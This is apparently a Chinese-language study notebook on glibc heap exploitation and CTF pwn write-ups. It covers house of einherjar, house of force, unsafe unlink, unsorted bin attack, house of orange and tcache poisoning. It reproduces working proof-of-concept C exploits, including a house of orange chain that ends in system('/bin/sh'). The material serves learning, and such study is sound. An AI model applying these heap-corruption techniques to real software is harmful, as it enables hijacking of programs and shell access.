那么他最终获得的是，maloc获得的是+0x10之后的，所以

最后获得的就是stack_var+0x8的地址是堆块首地址

![image-20261027211140248](assets/image-20261027211140248.png)

这是修改d之前

接下来修改d指针指向的值

![image-20261027211242376](assets/image-20261027211242376.png)

可以看到a的fd指针处的值确实被修改了

![image-20261027211349629](assets/image-20261027211349629.png)

他后面8字节确实是0x20

![image-20261027211441213](assets/image-20261027211441213.png)

在这里可以看到，在又一次申请堆块之后栈地址确实是被写入了

![image-20261027212251212](assets/image-20261027212251212.png)

所以说这就是最后得到的申请的堆块吗，地址是98结尾的，之后如果这里是返回地址的话，直接篡改就行了。

![image-20261027212701087](assets/image-20261027212701087.png)

又调一次

![image-20261027212728784](assets/image-20261027212728784.png)

![image-20261027212748094](assets/image-20261027212748094.png)

接下来e指向的就是那个地址

![image-20261027212833357](assets/image-20261027212833357.png)

![image-20261027212922598](assets/image-20261027212922598.png)

确实是申请到了栈地址

所以主要的就是伪造的栈地址需要满足size字段，之后fd改为size-0x8

之后malloc得到的地址就是size+0x10

## house_of_einherjar

使用条件：**单字节越界（off-by-one）**，可以向一块 malloc 分配出的堆块写入一个空字节（null byte）的场景

unlink checks

复用机制：

**如果前一个块还在用，我这个块的 `prev_size` 就借给他当数据区用。**

不多说了兄弟们，看了翻译就是一个堆块溢出之后，修改下一个的presize字段（还需要考虑unlink机制），之后的话，直接free就行了吧应该

```c
gcc -g -O0 -o 1 1.c
```

![image-20261028103837602](assets/image-20261028103837602.png)

首先就是申请一个小堆块

我去原来第一个堆块加上的大小不是0x10而是0x8，前面的pre_size字段被复用了

![image-20261028104220458](assets/image-20261028104220458.png)

而且

![image-20261028104325734](assets/image-20261028104325734.png)

![image-20261028104354983](assets/image-20261028104354983.png)

所以大小是0x40字节

然后接下来需要真实的chunka大小

![image-20261028104602563](assets/image-20261028104602563.png)

接下来伪造fake_chunk

![image-20261028104710928](assets/image-20261028104710928.png)

![image-20261028111924432](assets/image-20261028111924432.png)

然后申请的是0xf8大小的

![image-20261028104836598](assets/image-20261028104836598.png)

![image-20261028104910324](assets/image-20261028104910324.png)

接下来直接溢出

![image-20261028112954764](assets/image-20261028112954764.png)

![image-20261028113116376](assets/image-20261028113116376.png)

可以看到b的size字段低位变成0

接下来好像是直接算偏移，用b的chunk地址减去伪造fake_chunk的地址，这应该是大小吧

![image-20261028113556663](assets/image-20261028113556663.png)

可以看到b的pre_size字段已经被修改了

![image-20261028113744757](assets/image-20261028113744757.png)

这应该就是计算过程

![image-20261028113844704](assets/image-20261028113844704.png)

fake[chunk1]=fake_size

![image-20261028113930492](assets/image-20261028113930492.png)

![image-20261028114229310](assets/image-20261028114229310.png)

free（b）之后的效果

![image-20261028114804832](assets/image-20261028114804832.png)

fake_chunk的大小改变了，

![image-20261028115346751](assets/image-20261028115346751.png)

接下来申请堆块

![image-20261028115414287](assets/image-20261028115414287.png)

![image-20261028115450441](assets/image-20261028115450441.png)

可以看到，申请的堆首地址是我们伪造的fake_chunk,接下来就可以在此修改内容

嘶就是堆块重叠，之后的话，伪造堆块（需要注意绕过unlink机制，之后再次申请堆块需要绕过检查），堆溢出修改pre_size的标志位，

之后修改伪造堆块的size,改成计算出来的pre_size,之后的话就可以free,之后再次申请，就可以得到我们伪造堆块的地址，进而修改其内容。

## house_of_force（任意地址写）

哦，这个是修改top_chunk的size字段，使得直接从top_chunk分配相应大小的堆块

相应操作记起来好像只有，将top_chunk字段改为-1,当然需要首先安防一个小堆块用来堆溢出，之后free这个小堆块之后，（这里好像并没有和top_chunk合并）会和top_chunk合并，因为我们申请的是一个大堆块。之后就会直接从top_chunk分配，有啥用？只是申请一个地址吗？

原来是通过修改top_chunk的相关偏移，得到申请堆块的大小，进而实现任意地址写

![image-20261028151922821](assets/image-20261028151922821.png)

```c
gcc -g -O0 -o 1 1.c
```

首先我们想要下下一次分配的地址是目标地址：

new_top=target-0x10(这样的话下一次malloc才会分配（new_top+0x10=target）)

那么我们第一次请求的大小是多少？

首先new_top=old_top+nb(malloc.size+0x10)

而 new_top=target-0x10=old_top+nb(malloc.size+0x10)

所以malloc.size=target-0x20-old_top

这个就是我们想要请求的大小

接下来直接调：

![image-20261028152912666](assets/image-20261028152912666.png)

首先申请0x100大小的堆块

![image-20261028152945959](assets/image-20261028152945959.png)

![image-20261028153103287](assets/image-20261028153103287.png)

接下来知道top_chunk的地址

![image-20261028153239486](assets/image-20261028153239486.png)

![image-20261028153257103](assets/image-20261028153257103.png)

接下来修改top_chunk的大小

![image-20261028153508489](assets/image-20261028153508489.png)

![image-20261028153723098](assets/image-20261028153723098.png)

虽然上面会提示一大堆，但是最终还是修改完成了

接下来就是计算我们需要申请的大小

![image-20261028153849818](assets/image-20261028153849818.png)

进行申请

![image-20261028154549845](assets/image-20261028154549845.png)

接下来会申请堆块，获得的malloc地址就是我们的target_addr

![image-20261028155115270](assets/image-20261028155115270.png)

接下来修改内容

![image-20261028155324955](assets/image-20261028155324955.png)

![image-20261028163551997](assets/image-20261028163551997.png)

可以看到相关的内容确实被改写了

希望不要忘记

接下来我就挑一点值得复现的做做

## unsafe_unlink

脱链吗？希望之前看的一部分还有点用

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>

uint64_t *chunk0_ptr;

int main()
{
	setbuf(stdout, NULL);
	printf("Welcome to unsafe unlink 2.0!\n");
	printf("Tested in Ubuntu 14.04/16.04 64bit.\n");
	printf("This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n");
	printf("The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n");

	int malloc_size = 0x80; //we want to be big enough not to use fastbins
	int header_size = 2;

	printf("The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n");

	chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0
	uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1
	printf("The global chunk0_ptr is at %p, pointing to %p\n", &chunk0_ptr, chunk0_ptr);
	printf("The victim chunk we are going to corrupt is at %p\n\n", chunk1_ptr);

	printf("We create a fake chunk inside chunk0.\n");
	printf("We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &chunk0_ptr so that P->fd->bk = P.\n");
	chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
	printf("We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &chunk0_ptr so that P->bk->fd = P.\n");
	printf("With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) == False\n");
	chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);
	printf("Fake chunk fd: %p\n",(void*) chunk0_ptr[2]);
	printf("Fake chunk bk: %p\n\n",(void*) chunk0_ptr[3]);

	printf("We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n");
	uint64_t *chunk1_hdr = chunk1_ptr - header_size;
	printf("We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n");
	printf("It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n");
	chunk1_hdr[0] = malloc_size;
	printf("If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n",(void*)chunk1_hdr[0]);
	printf("We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n\n");
	chunk1_hdr[1] &= ~1;

	printf("Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n");
	printf("You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n");
	free(chunk1_ptr);

	printf("At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n");
	char victim_string[8];
	strcpy(victim_string,"Hello!~");
	chunk0_ptr[3] = (uint64_t) victim_string;

	printf("chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n");
	printf("Original value: %s\n",victim_string);
	chunk0_ptr[0] = 0x4141414142424242LL;
	printf("New Value: %s\n",victim_string);

	// sanity check
	assert(*(long *)victim_string == 0x4141414142424242L);
}


```

```bash
gcc -g -O0 -o 1 1.c
```

额，我觉得就是在原来的第一个堆块上伪造相应的fd和bk（所以最后），着重伪造的应该是

其fd字段和bk字段

fd:fakechunk-0x18    bk:fakechunk-0x10

之后再次篡改下一个堆块的pre_size的大小和标志位，在free这个堆块的时候就会触发unlink

这个时候我们伪造的堆块就会起作用，

![image-20261028174812894](assets/image-20261028174812894.png)

之后就修改原本指针指向的地址。有点乱

调一下：

首先申请一个0x80大小的堆块chunk0

![image-20261028175519431](assets/image-20261028175519431.png)

接下来又申请一个0x80大小的堆块为chunk1

![image-20261029144743903](assets/image-20261029144743903.png)

chunk1也可以了

![image-20261029150024128](assets/image-20261029150024128.png)

好吧，这两个指针有点耐人寻味

也就是说这个指针在内存中的地址是

0x602078

而它实际指向的的是

0x603010

接下来在chunk0里面创建fake_chunk

![image-20261029150856724](assets/image-20261029150856724.png)

这是一开始创建的chunk0

接下来执行完这一句之后

![image-20261029151024898](assets/image-20261029151024898.png)

![image-20261029151116123](assets/image-20261029151116123.png)

伪造的fd被写入进去

接下来是伪造的bk

![image-20261029151244533](assets/image-20261029151244533.png)

接下来应该修改的是chunk1的pre_size位置

![image-20261029152822009](assets/image-20261029152822009.png)

可以看到确实是被换成了0x80

但是我们需要伪造的是前一个堆块被释放的状态，所以，还需要修改其size位最后字节为0

![image-20261029153046744](assets/image-20261029153046744.png)

修改完成，但是应该还需要修改fake_chunk的size位，以至于更好通过检查。额，好i谢谢昂不对

![image-20261029153330702](assets/image-20261029153330702.png)

居然直接free掉堆块了吗

![image-20261029153621529](assets/image-20261029153621529.png)

这是释放完之后的样子，bins里什么都没有

![image-20261029153704557](assets/image-20261029153704557.png)

我去，怎么指过去的？

![image-20261029154646723](assets/image-20261029154646723.png)

（额）原来chunk0的指针存在0x602078这个位置，然后指向的是0x603010

之后触发unlink机制，之后的话

最后一句是

BK-fd=FD

而FD就是0x602078-0x18=0x602060

所以就是将0x602078指向的内容从0x603010变成0x602060

所以此时的chunk0也就是0x602078还以为指向的是0x603010,但是其实已经变成0x602060

所以chunk0[3]就是0x602078,之后再次将这个地址里面写入栈上地址，之后

看这：：：：：：：

也就是一开始&chunk0是0x602078指向的是0x603010,之后的话，改成了0x602060,而现在chunk[3] (修改其指向的内容为栈上地址)，之后修改chunk[0]就会变成修改栈上内容了

![](assets/image-20261029155946398.png)

![image-20261029163320021](assets/image-20261029163320021.png)

修改完之后直接修改数据即可。

这就是unlink实现任意地址写。服了。

##  unsorted_bin_attack

```bash
gcc -g -O0 -o 1 1.c
```

反正这个就是任意地址写入大数据

![image-20261031103616274](assets/image-20261031103616274.png)

只需要将目标地址-0x10写入即将进入的unsortedbin

之后在进入unsoretdbin之后再次申请之后就可以触发相关的攻击写入

首先

![image-20261031104441800](assets/image-20261031104441800.png)

![image-20261031104816213](assets/image-20261031104816213.png)

可以看到已经有数据是一开始设置的0

之后申请大堆块

![image-20261031110714763](assets/image-20261031110714763.png)

首先设置指针p指向堆块内容区

之后直接

![image-20261031111531658](assets/image-20261031111531658.png)

接着再申请一个防止free之后与topchunk合并

![image-20261031111858342](assets/image-20261031111858342.png)

接下来应该是将target-0x10写入其bk位置

![image-20261031112155237](assets/image-20261031112155237.png)

首先是free之后再写入

![image-20261031112230857](assets/image-20261031112230857.png)

已经进入unsortedbin,

![image-20261031112307913](assets/image-20261031112307913.png)

所以说在最后触发攻击的时候是在释放的时候

![image-20261031122038219](assets/image-20261031122038219.png)

![image-20261031122203741](assets/image-20261031122203741.png)

接下来就是将目标地址-0x10放进bk，最后就可以

![image-20261031122705021](assets/image-20261031122705021.png)

已经写进去了，之后直接malloc

![image-20261031122827004](assets/image-20261031122827004.png)

看到68位置的值已经被修改了

反正应该就是只要大于0x80就可以

放进去

## house of spirit

首先申请一个小堆块

![image-20261031155157719](assets/image-20261031155157719.png)

接下来应该是在栈上寻找一个合适的位置来放置合适的假堆块

![image-20261031161050242](assets/image-20261031161050242.png)

修改fake_chunk的size

![image-20261031161501216](assets/image-20261031161501216.png)

之后修改另一个

然后是将堆指针改成db20哪个位置

![image-20261031162531704](assets/image-20261031162531704.png)

![image-20261031164746229](assets/image-20261031164746229.png)

接下来接着申请0x30的堆块就可以

获取到栈地址上的堆块了

![image-20261031170158895](assets/image-20261031170158895.png)

你有空好好看吧

## poison_null_byte

调一下

申请一个0x100的堆块

![image-20261102100613877](assets/image-20261102100613877.png)

接着申请三个堆块，最后那一个是用来防止合并的

![image-20261102100805816](assets/image-20261102100805816.png)

![image-20261102101149747](assets/image-20261102101149747.png)

![image-20261102103317798](assets/image-20261102103317798.png)

这一步就是为了绕过相关检查机制，因为现在它的大小已经被改成0x200所以接下来就会去下方0x200大小的地方寻找相邻堆块的pre_size位置，之后就会绕过检查

![image-20261102103816165](assets/image-20261102103816165.png)

接下来就free并且修改chunkb 的size字段

![image-20261102104726964](assets/image-20261102104726964.png)

![image-20261102104758758](assets/image-20261102104758758.png)

size字段已经修改完成

## House of orange

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>

/*
  The House of Orange uses an overflow in the heap to corrupt the _IO_list_all pointer
  It requires a leak of the heap and the libc 
  <House of Orange 技术利用堆溢出漏洞来篡改 _IO_list_all 指针。它（在利用时）需要堆地址和 libc 地址的泄露。”>
  Credit: http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html
*/

/*
   This function is just present to emulate the scenario where
   the address of the function system is known.
   <这个函数仅仅是为了模拟‘已知 system 函数地址’的场景而存在的>
*/
int winner ( char *ptr);

int main()
{
    /*
      The House of Orange starts with the assumption that a buffer overflow exists on the heap
      using which the Top (also called the Wilderness) chunk can be corrupted.
      
      At the beginning of execution, the entire heap is part of the Top chunk.
      The first allocations are usually pieces of the Top chunk that are broken off to service the request.
      Thus, with every allocation, the Top chunks keeps getting smaller.
      And in a situation where the size of the Top chunk is smaller than the requested value,
      there are two possibilities:
       1) Extend the Top chunk
       2) Mmap a new page

      If the size requested is smaller than 0x21000, then the former is followed.
    */

    char *p1, *p2;
    size_t io_list_all, *top;

    fprintf(stderr, "The attack vector of this technique was removed by changing the behavior of malloc_printerr, "
        "which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).\n");
  
    fprintf(stderr, "Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,"
        "https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51\n");

    /*
      Firstly, lets allocate a chunk on the heap.
    */这是申请堆块
        

    p1 = malloc(0x400-16);

    /*
       The heap is usually allocated with a top chunk of size 0x21000
       Since we've allocate a chunk of size 0x400 already,
       what's left is 0x20c00 with the PREV_INUSE bit set => 0x20c01.

       The heap boundaries are page aligned. Since the Top chunk is the last chunk on the heap,
       it must also be page aligned at the end.

       Also, if a chunk that is adjacent to the Top chunk is to be freed,
       then it gets merged with the Top chunk. So the PREV_INUSE bit of the Top chunk is always set.

       So that means that there are two conditions that must always be true.
        1) Top chunk + size has to be page aligned
        2) Top chunk's prev_inuse bit has to be set.

       We can satisfy both of these conditions if we set the size of the Top chunk to be 0xc00 | PREV_INUSE.
       What's left is 0x20c01

       Now, let's satisfy the conditions
       1) Top chunk + size has to be page aligned
       2) Top chunk's prev_inuse bit has to be set.
    */

    top = (size_t *) ( (char *) p1 + 0x400 - 16);
    top[1] = 0xc01;

    /* 
       Now we request a chunk of size larger than the size of the Top chunk.
       Malloc tries to service this request by extending the Top chunk
       This forces sysmalloc to be invoked.

       In the usual scenario, the heap looks like the following
          |------------|------------|------...----|
          |    chunk   |    chunk   | Top  ...    |
          |------------|------------|------...----|
      heap start                              heap end

       And the new area that gets allocated is contiguous to the old heap end.
       So the new size of the Top chunk is the sum of the old size and the newly allocated size.

       In order to keep track of this change in size, malloc uses a fencepost chunk,
       which is basically a temporary chunk.

       After the size of the Top chunk has been updated, this chunk gets freed.

       In our scenario however, the heap looks like
          |------------|------------|------..--|--...--|---------|
          |    chunk   |    chunk   | Top  ..  |  ...  | new Top |
          |------------|------------|------..--|--...--|---------|
     heap start                            heap end

       In this situation, the new Top will be starting from an address that is adjacent to the heap end.
       So the area between the second chunk and the heap end is unused.
       And the old Top chunk gets freed.
       Since the size of the Top chunk, when it is freed, is larger than the fastbin sizes,
       it gets added to list of unsorted bins.
       Now we request a chunk of size larger than the size of the top chunk.
       This forces sysmalloc to be invoked.
       And ultimately invokes _int_free

       Finally the heap looks like this:
          |------------|------------|------..--|--...--|---------|
          |    chunk   |    chunk   | free ..  |  ...  | new Top |
          |------------|------------|------..--|--...--|---------|
     heap start                                             new heap end



    */

    p2 = malloc(0x1000);
    /*
      Note that the above chunk will be allocated in a different page
      that gets mmapped. It will be placed after the old heap's end

      Now we are left with the old Top chunk that is freed and has been added into the list of unsorted bins


      Here starts phase two of the attack. We assume that we have an overflow into the old
      top chunk so we could overwrite the chunk's size.
      For the second phase we utilize this overflow again to overwrite the fd and bk pointer
      of this chunk in the unsorted bin list.
      There are two common ways to exploit the current state:
        - Get an allocation in an *arbitrary* location by setting the pointers accordingly (requires at least two allocations)
        - Use the unlinking of the chunk for an *where*-controlled write of the
          libc's main_arena unsorted-bin-list. (requires at least one allocation)

      The former attack is pretty straight forward to exploit, so we will only elaborate
      on a variant of the latter, developed by Angelboy in the blog post linked above.

      The attack is pretty stunning, as it exploits the abort call itself, which
      is triggered when the libc detects any bogus state of the heap.
      Whenever abort is triggered, it will flush all the file pointers by calling
      _IO_flush_all_lockp. Eventually, walking through the linked list in
      _IO_list_all and calling _IO_OVERFLOW on them.

      The idea is to overwrite the _IO_list_all pointer with a fake file pointer, whose
      _IO_OVERLOW points to system and whose first 8 bytes are set to '/bin/sh', so
      that calling _IO_OVERFLOW(fp, EOF) translates to system('/bin/sh').
      More about file-pointer exploitation can be found here:
      https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/

      The address of the _IO_list_all can be calculated from the fd and bk of the free chunk, as they
      currently point to the libc's main_arena.
    */

    io_list_all = top[2] + 0x9a8;

    /*
      We plan to overwrite the fd and bk pointers of the old top,
      which has now been added to the unsorted bins.

      When malloc tries to satisfy a request by splitting this free chunk
      the value at chunk->bk->fd gets overwritten with the address of the unsorted-bin-list
      in libc's main_arena.

      Note that this overwrite occurs before the sanity check and therefore, will occur in any
      case.

      Here, we require that chunk->bk->fd to be the value of _IO_list_all.
      So, we should set chunk->bk to be _IO_list_all - 16
    */
 
    top[3] = io_list_all - 0x10;

    /*
      At the end, the system function will be invoked with the pointer to this file pointer.
      If we fill the first 8 bytes with /bin/sh, it is equivalent to system(/bin/sh)
    */

    memcpy( ( char *) top, "/bin/sh\x00", 8);

    /*
      The function _IO_flush_all_lockp iterates through the file pointer linked-list
      in _IO_list_all.
      Since we can only overwrite this address with main_arena's unsorted-bin-list,
      the idea is to get control over the memory at the corresponding fd-ptr.
      The address of the next file pointer is located at base_address+0x68.
      This corresponds to smallbin-4, which holds all the smallbins of
      sizes between 90 and 98. For further information about the libc's bin organisation
      see: https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/

      Since we overflow the old top chunk, we also control it's size field.
      Here it gets a little bit tricky, currently the old top chunk is in the
      unsortedbin list. For each allocation, malloc tries to serve the chunks
      in this list first, therefore, iterates over the list.
      Furthermore, it will sort all non-fitting chunks into the corresponding bins.
      If we set the size to 0x61 (97) (prev_inuse bit has to be set)
      and trigger an non fitting smaller allocation, malloc will sort the old chunk into the
      smallbin-4. Since this bin is currently empty the old top chunk will be the new head,
      therefore, occupying the smallbin[4] location in the main_arena and
      eventually representing the fake file pointer's fd-ptr.

      In addition to sorting, malloc will also perform certain size checks on them,
      so after sorting the old top chunk and following the bogus fd pointer
      to _IO_list_all, it will check the corresponding size field, detect
      that the size is smaller than MINSIZE "size <= 2 * SIZE_SZ"
      and finally triggering the abort call that gets our chain rolling.
      Here is the corresponding code in the libc:
      https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3717
    */

    top[1] = 0x61;

    /*
      Now comes the part where we satisfy the constraints on the fake file pointer
      required by the function _IO_flush_all_lockp and tested here:
      https://code.woboq.org/userspace/glibc/libio/genops.c.html#813

      We want to satisfy the first condition:
      fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base
    */

    FILE *fp = (FILE *) top;


    /*
      1. Set mode to 0: fp->_mode <= 0
    */

    fp->_mode = 0; // top+0xc0


    /*
      2. Set write_base to 2 and write_ptr to 3: fp->_IO_write_ptr > fp->_IO_write_base
    */

    fp->_IO_write_base = (char *) 2; // top+0x20
    fp->_IO_write_ptr = (char *) 3; // top+0x28


    /*
      4) Finally set the jump table to controlled memory and place system there.
      The jump table pointer is right after the FILE struct:
      base_address+sizeof(FILE) = jump_table

         4-a)  _IO_OVERFLOW  calls the ptr at offset 3: jump_table+0x18 == winner
    */

    size_t *jump_table = &top[12]; // controlled memory
    jump_table[3] = (size_t) &winner;
    *(size_t *) ((size_t) fp + sizeof(FILE)) = (size_t) jump_table; // top+0xd8


    /* Finally, trigger the whole chain by calling malloc */
    malloc(10);

   /*
     The libc's error message will be printed to the screen
     But you'll get a shell anyways.
   */

    return 0;
}

int winner(char *ptr)
{ 
    system(ptr);
    syscall(SYS_exit, 0);
    return 0;
}
```

相关机制：

在 `malloc` 过程中，当从 Unsorted Bin 中获取一个块时，会调用 `unlink`

### ptmalloc机制

![image-20261125190132468](assets/image-20261125190132468.png)



单链表（lifo）：后进先出

![image-20261125105056244](assets/image-20261125105056244.png)

调试：“

```bash
sudo sysctl -w kernel.yama.ptrace_scope=0
```

调试的时候加上-g参数，然后调试的时候就会看到代码

首先申请一个堆块

![image-20261125150114614](assets/image-20261125150114614.png)

![image-20261125150302006](assets/image-20261125150302006.png)

下面就是此时的top_chunk的大小

![image-20261125151005869](assets/image-20261125151005869.png)

那个top就是指向这个的地方

![image-20261125151328166](assets/image-20261125151328166.png)

![image-20261125151133061](assets/image-20261125151133061.png)

这个就是top1

之后的话就是直接修改其大小

（不能直接从top里面切，而是需要调用sysmalloc ）

```c
assert ((old_top == initial_top(av) && old_size == 0) ||
        (old_size >= MINSIZE && prev_inuse(old_top) &&
         ((unsigned long)old_end & (pagesize - 1)) == 0));
```

![image-20261125190857619](assets/image-20261125190857619.png)

这个时候以经将那个top_chunk的size字段改成了c01

![image-20261125191041827](assets/image-20261125191041827.png)

申请x01000

效果：

![image-20261125191120391](assets/image-20261125191120391.png)

这是在泄露libc地址吗，这里其实是申请了0x1000

![image-20261125195731200](assets/image-20261125195731200.png)

之后的top[3]就是bk指针

![image-20261125195959512](assets/image-20261125195959512.png)

![image-20261125200121599](assets/image-20261125200121599.png)

之后的话，将相关字符串写入top的开头

![image-20261125201742610](assets/image-20261125201742610.png)

之后又修改了topchunk的size大小

![image-20261125201814947](assets/image-20261125201814947.png)

![image-20261125201847173](assets/image-20261125201847173.png)

之后

![image-20261125203126677](assets/image-20261125203126677.png)

![image-20261125203115043](assets/image-20261125203115043.png)

![image-20261125203733845](assets/image-20261125203733845.png)

![image-20261126000422824](assets/image-20261126000422824.png)

![image-20261126000444189](assets/image-20261126000444189.png)

也就是说这三个参数的设置就只是为了通过这个if检查，之后的话好进入_IO_OVERFLOW





看懵了

### FILE结构体

| 字段             | 偏移 |
| :--------------- | :--- |
| `_flags`         | 0x00 |
| `_IO_read_ptr`   | 0x08 |
| `_IO_write_base` | 0x20 |
| `_IO_write_ptr`  | 0x28 |
| `_chain`         | 0x68 |
| `_mode`          | 0xc0 |
| `vtable`         | 0xd8 |

![image-20261126000826368](assets/image-20261126000826368.png)

青色三行——决定成立后干什么。 _IO_OVERFLOW(fp, EOF) 实际是调用 fp->vtable->__overflow(fp, EOF)。2.23 不检查 vtable 指针，所以我们在堆上造一张假表，把 __overflow 那个槽填成 system。而第一个参数传的就是 fp 本身——所以把 "/bin/sh" 放在伪造 FILE 的开头，system(fp) 就变成了 system("/bin/sh")。_chain 则是让 _IO_list_all 那条链表能走到我们这块。

### malloc_printerr

![image-20261126001351918](assets/image-20261126001351918.png)

2.26 那个提交把这条链路拆掉了，`malloc_printerr` 不再触发 `_IO_flush_all_lockp`

![image-20261126001548885](assets/image-20261126001548885.png)























































# hitcon_2018_children_tcache（off by null）

```bash
patchelf --set-interpreter /home/nan/桌面/tiaozhan/ld-2.35.so ./pwn
patchelf --set-rpath /home/nan/桌面/tiaozhan/libc.so.6 ./pwn
patchelf --set-rpath /home/nan/桌面/tiaozhan/2.23-0ubuntu3_amd64 ./pwn
patchelf --set-interpreter /home/nan/桌面/pwn/2.23-0ubuntu3_amd64/ld-2.23.so ./note
```

因为是ubuntu18所以修改一下相关连接器

检查命令

```bash
ldd ./pwn
```

![image-20261102164658329](assets/image-20261102164658329.png)

这个是修改成绝对路径成功的

![image-20261102164809384](assets/image-20261102164809384.png)

检查，还需要泄露libc地址

Ida分析

add函数

![image-20261102165537226](assets/image-20261102165537226.png)

show函数

![image-20261102165657594](assets/image-20261102165657594.png)

而off by null漏洞就是看的是strcpy函数来触发的

然后就是那四个堆块，首先释放那个chunk0进入unsortedbin (为了之后修改完相关操作之后，发现是空闲的，因此向前合并)

接下来chunk1,因为申请有先后顺序，所以一开始在申请完之后释放掉，之后再次申请相同大小的堆块，之后利用add函数的添加内容操作进行修改chun2的presize位

首先创建完堆块之后

tcache大小条件：

**`[0x20, 0x410]`**

所以如果好计算地址的话，那么就直接0x4f0,因为增加对头就会补充到0x500

![image-20261102182014196](assets/image-20261102182014196.png)

接下来释放·chun0和chunk1

![image-20261102182140557](assets/image-20261102182140557.png)

一个进入unsortedbin 一个进入tcache

接下来再次申请0x58大小的堆块，并且写入数据覆盖到

![image-20261102182614232](assets/image-20261102182614232.png)

这个是目前chunk1的状态，可以看到其数据区确实是填充到了chunk2的pre_size的位置

然后再次申请和tcashe大小相同的堆块

![image-20261102202426955](assets/image-20261102202426955.png)

可以看到填充到头部的同时，也将chunk2的低字节改写成了0（strcpy）

现在需要修改chunk2的pre_size位

这里你释放之后再次申请，其实序号会变化，也就是会变成chunk0

噗，自己想通过直接写入修改其0x50-0x58字节，不会试过

所以用的人家的循环写入

![image-20261102204821622](assets/image-20261102204821622.png)

之后的话直接将大小写入就行

![image-20261102205228954](assets/image-20261102205228954.png)

就像是这样

之后的话直接freechunk2这样的话，chunk1和chunk0就会合并和chunk2

![image-20261102205453912](assets/image-20261102205453912.png)

free之后就是这样

这样的话没就把chunk1也包含进去了

![image-20261102210048067](assets/image-20261102210048067.png)

delete 0之后有申请了一个，有释放掉了2，所以再次申请的话，那么就会成为1

不不不。你把那个原来的chunk0申请完之后，此时那个unsortedbin的头部就会成为原来Index0也就是那个0x60大小头部，所以最后只需要show(0)就可以得到libc地址

所以现在的chunk1的地址在bin中出现，又在没有被free掉的里面出现

![image-20261102211955995](assets/image-20261102211955995.png)

![image-20261102212008994](assets/image-20261102212008994.png)

而这个时候如果再释放hcunk1的话，那么就会double free(不对)



应该是再次申请和chunk1大小相同的堆块，然后因为Index0指向它，还有新申请的index2指向他，接着分别释放，就可以

![image-20261102212649648](assets/image-20261102212649648.png)

就像这样

接着就是将free_hook的地址写入，之后就修改吧

# [V&N2020 公开赛]easyTHeap（差一步美满）

![image-20261105181836066](assets/image-20261105181836066.png)

edit函数

![image-20261105182749131](assets/image-20261105182749131.png)

好像是没有限制大小，可以溢出

delete函数：

![image-20261105182900794](assets/image-20261105182900794.png)

保护依旧全开，还是应该先泄露libc地址，之后写入

```bash
patchelf --set-interpreter /home/nan/桌面/pwn/2.27-3ubuntu1_amd64/ld-2.27.so ./pwn
patchelf --set-rpath /home/nan/桌面/pwn/2.27-3ubuntu1_amd64 ./pwn
```

![image-20261106165642907](assets/image-20261106165642907.png)

这里的add限制大小了

可是这道题中delete函数存在uaf漏洞

![image-20261106171158302](assets/image-20261106171158302.png)

![image-20261106171252050](assets/image-20261106171252050.png)

s0是指针数组，s1是大小数组

![image-20261106171656745](assets/image-20261106171656745.png)

所以才说这个delete函数存在uaf漏洞

整体思路：

**利用连续两次 `delete` 制造 Tcache Dup（双重释放） -> 泄露 `tcache_perthread_struct` 结构体地址 -> 篡改 Tcache 计数使块进入 Unsorted Bin 泄露 Libc -> 最终通过 Tcache Poisoning 劫持 `__malloc_hook` 并配合 `realloc` 调栈拿 Shell。**

现在只是能够理解到double free

之后的话泄露结构体地址之后不清楚

![image-20261106172221355](assets/image-20261106172221355.png)

add函数中有这个，限制堆块数量最大为7

```c++
typedef struct tcache_perthread_struct
{
  char counts[64];              // 记录每个 bin 里装了几个块
  tcache_entry *entries[64];    // 记录每个 bin 的链表头指针
} tcache_perthread_struct;
```

所以说一开始就是获得这个结构体，然后的话去修改其大小，因为一开始这个里面最多只能装7个，如果修改成一个及其大的数的话，那么剩余的就会进入unsortedbin

接下来创建几个堆块

![image-20261106175044484](assets/image-20261106175044484.png)

这是一个大堆块

正好，了解一下存在于tcashe中堆块结构

![image-20261106175555658](assets/image-20261106175555658.png)

0x30大小的堆块

也就是说原来的bk字段就是key的值，但是这里是0

或许是因为没有清零堆指针

所以接下来就直接uaf看一下效果

![image-20261106182627669](assets/image-20261106182627669.png)

![image-20261106182730834](assets/image-20261106182730834.png)

不是，你究竟可以泄露出什么？

![image-20261106182850361](assets/image-20261106182850361.png)

heap一开始的大堆块：

![image-20261106183046702](assets/image-20261106183046702.png)

又一次堆开头：

